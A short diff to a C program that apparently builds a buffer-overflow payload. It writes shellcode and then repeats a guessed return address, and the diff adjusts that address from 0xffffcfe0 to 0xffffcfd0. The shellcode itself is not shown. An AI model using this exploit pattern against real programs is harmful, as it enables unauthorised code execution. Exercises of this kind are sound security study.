@@ -26,7 +26,7 @@ int main (void)
 
     write(1, shellcode, sizeof(shellcode));
 
-    uint32_t goal = 0xffffcfe0;
+    uint32_t goal = 0xffffcfd0;
     for (int i = 0; i < 80; i++) {
         write(1, (void*)&goal, 4);
     }
